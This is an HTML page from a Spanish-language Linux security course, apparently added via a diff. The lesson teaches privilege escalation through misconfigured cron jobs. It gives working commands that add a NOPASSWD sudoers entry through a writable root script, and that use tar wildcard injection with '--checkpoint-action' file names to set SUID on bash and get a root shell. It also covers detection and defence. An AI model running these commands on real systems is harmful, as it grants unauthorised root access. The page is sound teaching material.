@@ -1,0 +1,245 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>50. Abusando de tareas Cron [2-3] | Introducción a Linux</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="../../css/styles.css" />
+    <style>
+      .lesson-content {
+        max-width: 800px;
+        margin: 2rem auto;
+        padding: 0 2rem 4rem;
+      }
+      .lesson-content h2 {
+        font-size: 1.5rem;
+        margin: 2rem 0 1rem;
+        color: var(--accent);
+      }
+      .lesson-content h3 {
+        font-size: 1.1rem;
+        margin: 1.5rem 0 0.5rem;
+        color: var(--text-1);
+      }
+      .lesson-content p {
+        color: var(--text-2);
+        margin-bottom: 1rem;
+        line-height: 1.8;
+      }
+      .lesson-content ul, .lesson-content ol {
+        color: var(--text-2);
+        margin-bottom: 1rem;
+        padding-left: 1.5rem;
+      }
+      .lesson-content li { margin-bottom: 0.4rem; }
+      .lesson-content .highlight {
+        background: var(--bg-card);
+        border-left: 3px solid var(--accent);
+        padding: 1rem 1.2rem;
+        border-radius: 0 8px 8px 0;
+        margin: 1rem 0;
+        font-size: 0.9rem;
+      }
+      .lesson-content .warning {
+        background: var(--bg-card);
+        border-left: 3px solid var(--red);
+        padding: 1rem 1.2rem;
+        border-radius: 0 8px 8px 0;
+        margin: 1rem 0;
+        font-size: 0.9rem;
+      }
+      .lesson-content code {
+        font-family: var(--mono);
+        background: var(--bg-hover);
+        padding: 0.1rem 0.4rem;
+        border-radius: 3px;
+        font-size: 0.85rem;
+        color: var(--accent);
+      }
+      .lesson-content pre {
+        background: var(--bg-card);
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        padding: 1rem 1.2rem;
+        margin: 1rem 0;
+        overflow-x: auto;
+      }
+      .lesson-content pre code {
+        background: none;
+        padding: 0;
+        color: var(--text-1);
+      }
+      .lesson-content .step {
+        background: var(--bg-card);
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        padding: 1rem 1.2rem;
+        margin: 0.8rem 0;
+      }
+      .lesson-content .step-num {
+        display: inline-block;
+        background: var(--accent);
+        color: #0a0c10;
+        font-weight: 700;
+        font-size: 0.75rem;
+        padding: 0.15rem 0.5rem;
+        border-radius: 4px;
+        margin-right: 0.5rem;
+        font-family: var(--mono);
+      }
+      .lesson-content table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 1rem 0;
+        font-size: 0.85rem;
+      }
+      .lesson-content th, .lesson-content td {
+        border: 1px solid var(--border);
+        padding: 0.6rem 0.8rem;
+        text-align: left;
+      }
+      .lesson-content th {
+        background: var(--bg-card);
+        color: var(--text-1);
+        font-weight: 600;
+      }
+      .lesson-content td { color: var(--text-2); }
+      .lesson-nav {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 3rem;
+        padding-top: 1.5rem;
+        border-top: 1px solid var(--border);
+      }
+      .lesson-nav a {
+        color: var(--accent);
+        text-decoration: none;
+        font-size: 0.9rem;
+        font-weight: 500;
+      }
+      .lesson-nav a:hover { text-decoration: underline; }
+      .back-link {
+        display: inline-flex;
+        align-items: center;
+        gap: 0.4rem;
+        color: var(--text-3);
+        text-decoration: none;
+        font-size: 0.85rem;
+        margin-bottom: 1rem;
+      }
+      .back-link:hover { color: var(--accent); }
+    </style>
+  </head>
+  <body>
+    <nav>
+      <a href="../../introduccion-a-linux.html" class="nav-logo">hack<span>4u</span></a>
+      <ul class="nav-links">
+        <li><a href="../../introduccion-a-linux.html">Cursos</a></li>
+        <li><a href="#">Roadmap</a></li>
+        <li><a href="#">Conócenos</a></li>
+      </ul>
+      <div class="nav-cta">
+        <button class="btn-ghost">Iniciar sesión</button>
+        <button class="btn-accent">Registrarse</button>
+      </div>
+    </nav>
+    <div style="background: var(--bg-deep); border-bottom: 1px solid var(--border);">
+      <div class="breadcrumb">
+        <a href="../../introduccion-a-linux.html">Inicio</a><span>›</span>
+        <a href="../../introduccion-a-linux.html">Cursos</a><span>›</span>
+        <a href="../../introduccion-a-linux.html">Introducción a Linux</a><span>›</span>
+        <span style="color: var(--text-2);">Clase 50</span>
+      </div>
+    </div>
+    <div class="lesson-content">
+      <a href="../../introduccion-a-linux.html" class="back-link">← Volver al curso</a>
+      <span class="course-tag">🐧 Linux · Ciberseguridad</span>
+      <h1 class="course-title" style="margin-bottom: 0.5rem;">Abusando de tareas Cron [2-3]</h1>
+      <div style="color: var(--text-3); font-size: 0.85rem; margin-bottom: 2rem;">Duración: 5:15 · Sección 2: Temario</div>
+
+      <p>En esta segunda parte exploramos tecnicas concretas de escalada de privilegios mediante Cron mal configurados: scripts editables por el usuario, wildcards peligrosas y la tecnica <code>tar --checkpoint</code>.</p>
+
+      <h2>Scripts modificables por el usuario</h2>
+      <p>Cuando un script ejecutado por root en Cron tiene permisos de escritura para nuestro usuario, podemos insertar codigo malicioso que se ejecutara con privilegios de root.</p>
+
+      <pre><code># Escenario: backup.sh se ejecuta como root cada 5 minutos
+# y nuestro usuario puede escribir en el
+
+# 1. Verificar permisos del script
+ls -la /usr/local/bin/backup.sh
+# -rwxrwxrwx 1 root root 120 ...  -> editable por todos!
+
+# 2. Anadir comando malicioso
+echo 'echo "usuario ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' >> /usr/local/bin/backup.sh
+
+# 3. Esperar a que cron ejecute el script
+# Ahora nuestro usuario tiene sudo sin password</code></pre>
+
+      <div class="highlight">
+        <strong>Deteccion:</strong> Busca archivos en directorios cron con permisos debiles: <code>find /etc/cron* -type f \( -perm -o+w -o -perm -g+w \) 2>/dev/null</code>. Revisa tambien los scripts referenciados en los crontabs (<code>cat /etc/crontab</code>).
+      </div>
+
+      <h2>Wildcards peligrosas en scripts Cron</h2>
+      <p>Cuando un script usa comodines (<code>*</code>) con comandos como <code>tar</code>, <code>rm</code> o <code>chmod</code>, podemos crear archivos con nombres que se interpreten como opciones del comando.</p>
+
+      <pre><code># Script vulnerable (backup.sh):
+# tar czf /backup/backup.tar.gz /var/www/html/*
+
+# 1. Crear un archivo cuyo nombre sea una opcion de tar
+cd /var/www/html
+touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec=sh shell.sh"
+
+# 2. Crear el script malicioso
+echo '#!/bin/bash' > shell.sh
+echo 'chmod +s /bin/bash' >> shell.sh
+
+# 3. Cuando cron ejecute tar, encontrara los archivos
+# y los interpretara como opciones, ejecutando shell.sh
+# Resultado: /bin/bash tendra SUID activado</code></pre>
+
+      <h2>Ejemplo practico paso a paso</h2>
+      <p>Veamos un escenario completo de explotacion de wildcards en Cron:</p>
+
+      <pre><code># En la maquina victima (como usuario normal)
+# 1. Identificar tarea cron vulnerable
+cat /etc/crontab
+# */5 * * * * root tar czf /tmp/backup.tar.gz /home/user/*
+
+# 2. Crear archivos con nombre de opciones
+cd /home/user
+echo '#!/bin/bash' > /tmp/exploit.sh
+echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/exploit.sh
+chmod +x /tmp/exploit.sh
+
+touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec=bash /tmp/exploit.sh"
+
+# 3. Esperar a que cron ejecute (maximo 5 minutos)
+# 4. Ejecutar el bash con SUID
+/tmp/rootbash -p
+# whoami -> root</code></pre>
+
+      <div class="warning">
+        <strong>Defensa:</strong> Para prevenir ataques de wildcards, nunca uses comodines directamente en scripts Cron. Usa <code>find ... -exec</code> o separa los archivos con <code>--</code> para indicar el fin de opciones: <code>tar czf backup.tar.gz -- /var/www/html/*</code>. Siempre verifica los permisos de los scripts en los directorios cron.
+      </div>
+
+      <div class="lesson-nav">
+        <a href="clase-49.html">← Anterior: Abusando de tareas Cron [1-3]</a>
+        <a href="clase-51.html">Siguiente: Abusando de tareas Cron [3-3] →</a>
+      </div>
+    </div>
+    <footer>
+      <div class="footer-logo">hack4u</div>
+      <div class="footer-links">
+        <a href="#">Aviso Legal</a>
+        <a href="#">Politica de Cookies</a>
+        <a href="#">Privacidad</a>
+        <a href="#">Terminos y Condiciones</a>
+      </div>
+      <div>© 2026 hack4u.io — Todos los derechos reservados.</div>
+    </footer>
+  </body>
+</html>
